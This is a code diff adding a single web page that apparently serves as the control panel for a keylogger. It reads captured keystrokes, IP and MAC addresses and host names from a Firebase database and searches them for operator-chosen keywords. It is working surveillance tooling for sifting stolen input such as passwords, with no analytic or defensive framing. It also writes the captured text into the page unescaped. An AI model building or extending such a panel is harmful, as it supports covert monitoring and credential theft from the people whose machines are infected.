@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="image.png" size="64*64" type="image/png">
+    <title>Firebase Data Fetch and Compare</title>
+    <style>
+        body {
+            background-color: #0e0e0e;
+            color: #00FF00;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: -1;
+        }
+        .container {
+            display: flex;
+            justify-content: space-around;
+            align-items: flex-start;
+            width: 100%;
+            max-width: 1200px;
+            height: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .results-container, .keywords-container {
+            background-color: #1c1c1c;
+            padding: 20px;
+            border: 1px solid #00FF00;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 255, 0, 0.3);
+            position: relative; /* Ensure relative positioning for absolute children */
+        }
+        .results-container {
+            flex: 4; /* Larger container for results */
+            margin-right: 20px;
+            overflow-y: auto; /* Allow scrolling */
+        }
+        .keywords-container {
+            flex: 2; /* Smaller container for keywords */
+            max-height: 650px; /* Set max height */
+            display: flex;
+            flex-direction: column;
+        }
+        h2 {
+            color: #00FF00;
+            font-size: 1.5em;
+            margin-bottom: 10px;
+            position: sticky;
+            top: 0;
+            background-color: #1c1c1c; /* Background to match container */
+            z-index: 1;
+        }
+        .results-table, .keywords-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .results-table th, .results-table td, .keywords-table th, .keywords-table td {
+            border: 1px solid #00FF00;
+            padding: 10px;
+            text-align: center;
+            vertical-align: middle;
+        }
+        .results-table th {
+            background-color: #002b36;
+            position: sticky;
+            top: 0;
+            z-index: 2;
+        }
+        .keywords-table th {
+            background-color: #002b36;
+            position: sticky;
+            top: 0;
+            z-index: 2;
+        }
+        .results-table-container {
+            margin-top: 10px;
+            position: relative;
+        }
+        .view-button {
+            background-color: #003b46;
+            color: #00FF00;
+            border: none;
+            padding: 6px 12px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 0.9em;
+            transition: background-color 0.3s ease;
+        }
+        .view-button:hover {
+            background-color: #004d4d;
+        }
+        .keywords-table-container {
+            flex: 1;
+            overflow-y: auto; /* Allow scrolling */
+        }
+        .keywords-input {
+            width: calc(100% - 24px); /* Adjust width to fit inside container */
+            padding: 12px;
+            background-color: #000000;
+            color: #0f0; /* Ensure the text color is set to green */
+            border: 2px solid #00FF00;
+            border-radius: 5px;
+            font-size: 1em;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            margin-top: 10px; /* Adjust margin as needed */
+            position: sticky;
+            bottom: 0;
+            z-index: 3;
+        }
+        .keywords-input:focus {
+            outline: none;
+            border-color: #33FF33;
+            box-shadow: 0 0 10px #33FF33;
+        }
+        .add-button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #003b46;
+            color: #00FF00;
+            border: 1px solid #00FF00;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 1em;
+            transition: background-color 0.3s ease;
+            position: sticky;
+            bottom: 0px;
+            z-index: 3;
+        }
+        .add-button:hover {
+            background-color: #004d4d;
+        }
+        .no-results {
+            color: #FF0000;
+            text-align: center;
+        }
+        .table-wrapper {
+            display: block;
+            max-height: 600px; /* Increased height for the results table */
+            overflow: auto;
+        }
+        ::-webkit-scrollbar {
+            width: 12px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1c1c1c;
+        }
+        ::-webkit-scrollbar-thumb {
+            background-color: #00FF00;
+            border-radius: 10px;
+            border: 3px solid #1c1c1c;
+        }
+        tr:hover {
+            background-color: #333333;
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script>
+        const firebaseConfig = {
+            // space for firebase api info
+        };
+
+        firebase.initializeApp(firebaseConfig);
+
+        function checkAuthStatus() {
+            firebase.auth().onAuthStateChanged((user) => {
+                if (!user) {
+                    // Redirect to index.html if not authenticated
+                    window.location.href = 'index.html';
+                } else {
+                    // User is authenticated, fetch and display data
+                    fetchDataAndCompare();
+                }
+            });
+        }
+
+        function fetchDataAndCompare() {
+            const loadingIndicator = document.createElement('div');
+            loadingIndicator.className = 'loading';
+            loadingIndicator.textContent = 'Loading data...';
+            document.getElementById('results').appendChild(loadingIndicator);
+            const db = firebase.database();
+            const logRef = db.ref('log');
+            const keywordsRef = db.ref('keywords');
+
+            logRef.once('value', (logSnapshot) => {
+                const logs = logSnapshot.val();
+                keywordsRef.once('value', (keywordsSnapshot) => {
+                    const keywords = keywordsSnapshot.val();
+                    displayKeywords(keywords);
+                    compareData(logs, keywords);
+                });
+            });
+        }
+
+        function compareData(logs, keywords) {
+            const results = [];
+            for (const logId in logs) {
+                const logEntry = logs[logId].keystrokes;
+                for (const keywordId in keywords) {
+                    const keyword = keywords[keywordId];
+                    if (logEntry.includes(keyword)) {
+                        results.push({
+                            ip: logs[logId].ip,
+                            mac: logs[logId].mac,
+                            host_name: logs[logId].host_name,
+                            keystrokes: logEntry,
+                            keyword: keyword
+                        });
+                    }
+                }
+            }
+            displayResults(results);
+        }
+
+        function displayResults(results) {
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = '<h2>Matching Results</h2>';
+            if (results.length > 0) {
+                const wrapper = document.createElement('div');
+                wrapper.classList.add('table-wrapper');
+                const table = document.createElement('table');
+                table.classList.add('results-table');
+                const thead = document.createElement('thead');
+                thead.innerHTML = '<tr><th>IP</th><th>MAC</th><th>Host Name</th><th>Keystrokes</th><th>Keyword</th></tr>';
+                table.appendChild(thead);
+                const tbody = document.createElement('tbody');
+                results.forEach(result => {
+                    const tr = document.createElement('tr');
+                    const viewButton = `<button class="view-button" onclick="viewDetails('${encodeURIComponent(result.keystrokes)}', '${encodeURIComponent(result.keyword)}', '${encodeURIComponent(result.mac)}')">View</button>`;
+                    tr.innerHTML = `<td>${result.ip}</td><td>${result.mac}</td><td>${result.host_name}</td><td>${viewButton}</td><td>${result.keyword}</td>`;
+                    tbody.appendChild(tr);
+                });
+                table.appendChild(tbody);
+                wrapper.appendChild(table);
+                resultsDiv.appendChild(wrapper);
+            } else {
+                resultsDiv.innerHTML += '<p class="no-results">No matching results found</p>';
+            }
+        }
+
+        function displayKeywords(keywords) {
+            const keywordsDiv = document.getElementById('keywords');
+            keywordsDiv.innerHTML = '';
+            if (keywords && Object.keys(keywords).length > 0) {
+                const wrapper = document.createElement('div');
+                wrapper.classList.add('keywords-table-container');
+                const table = document.createElement('table');
+                table.classList.add('keywords-table');
+                const thead = document.createElement('thead');
+                thead.innerHTML = '<tr><th>Keyword</th></tr>';
+                table.appendChild(thead);
+                const tbody = document.createElement('tbody');
+                for (const keywordId in keywords) {
+                    const keyword = keywords[keywordId];
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `<td>${keyword}</td>`;
+                    tbody.appendChild(tr);
+                }
+                table.appendChild(tbody);
+                wrapper.appendChild(table);
+                keywordsDiv.appendChild(wrapper);
+            } else {
+                keywordsDiv.innerHTML += '<p class="no-results">No keywords found</p>';
+            }
+        }
+
+        function addKeyword() {
+            const keywordInput = document.getElementById('keywordInput').value.trim();
+            if (keywordInput !== '') {
+                const keywordsRef = firebase.database().ref('keywords');
+                keywordsRef.orderByValue().equalTo(keywordInput).once('value', (snapshot) => {
+                    if (snapshot.exists()) {
+                        alert('Keyword already exists.');
+                    } else {
+                        keywordsRef.push(keywordInput)
+                            .then(() => {
+                                console.log('Keyword added successfully');
+                                document.getElementById('keywordInput').value = '';
+                                fetchDataAndCompare(); // Refresh keywords and results
+                            })
+                            .catch((error) => {
+                                console.error('Error adding keyword: ', error);
+                            });
+                    }
+                });
+            } else {
+                alert('Please enter a valid keyword.');
+            }
+        }
+
+        function viewDetails(keystrokes, keyword, mac) {
+            const url = `view.html?keystrokes=${keystrokes}&keyword=${keyword}&mac=${mac}`;
+            window.location.href = url;
+        }
+
+        document.addEventListener('DOMContentLoaded', (event) => {
+            checkAuthStatus();
+        });
+
+        window.onload = () => {
+            particlesJS('particles-js', {
+                particles: {
+                    number: {
+                        value: 60, // Reduced particle count
+                        density: {
+                            enable: true,
+                            value_area: 800
+                        }
+                    },
+                    color: {
+                        value: '#00FF00'
+                    },
+                    shape: {
+                        type: 'circle',
+                        stroke: {
+                            width: 0,
+                            color: '#000000'
+                        },
+                        polygon: {
+                            nb_sides: 5
+                        },
+                        image: {
+                            src: '',
+                            width: 100,
+                            height: 100
+                        }
+                    },
+                    opacity: {
+                        value: 0.5,
+                        random: false,
+                        anim: {
+                            enable: false,
+                            speed: 1,
+                            opacity_min: 0.1,
+                            sync: false
+                        }
+                    },
+                    size: {
+                        value: 3,
+                        random: true,
+                        anim: {
+                            enable: false,
+                            speed: 40,
+                            size_min: 0.1,
+                            sync: false
+                        }
+                    },
+                    line_linked: {
+                        enable: true,
+                        distance: 150,
+                        color: '#00FF00',
+                        opacity: 0.4,
+                        width: 1
+                    },
+                    move: {
+                        enable: true,
+                        speed: 3, // Reduced speed
+                        direction: 'none',
+                        random: false,
+                        straight: false,
+                        out_mode: 'out',
+                        bounce: false,
+                        attract: {
+                            enable: false,
+                            rotateX: 600,
+                            rotateY: 1200
+                        }
+                    }
+                },
+                interactivity: {
+                    detect_on: 'canvas',
+                    events: {
+                        onhover: {
+                            enable: true,
+                            mode: 'repulse'
+                        },
+                        onclick: {
+                            enable: true,
+                            mode: 'push'
+                        },
+                        resize: true
+                    },
+                    modes: {
+                        grab: {
+                            distance: 400,
+                            line_linked: {
+                                opacity: 1
+                            }
+                        },
+                        bubble: {
+                            distance: 250,
+                            size: 0,
+                            duration: 2,
+                            opacity: 0.8,
+                            speed: 3
+                        },
+                        repulse: {
+                            distance: 400,
+                            duration: 0.4
+                        },
+                        push: {
+                            particles_nb: 4
+                        },
+                        remove: {
+                            particles_nb: 2
+                        }
+                    }
+                },
+                retina_detect: true
+            });
+        };
+    </script>
+</head>
+<body>
+    <div class="particles" id="particles-js"></div>
+    <div class="container">
+        <div class="results-container">
+            <div id="results"></div>
+        </div>
+        <div class="keywords-container">
+            <h2>Keywords</h2>
+            <div class="keywords-table-container">
+                <div id="keywords"></div>
+            </div>
+            <input type="text" id="keywordInput" class="keywords-input" autocomplete="off" placeholder="Enter keyword"/>
+            <button class="add-button" onclick="addKeyword()">Add</button>
+        </div>
+    </div>
+</body>
+</html>
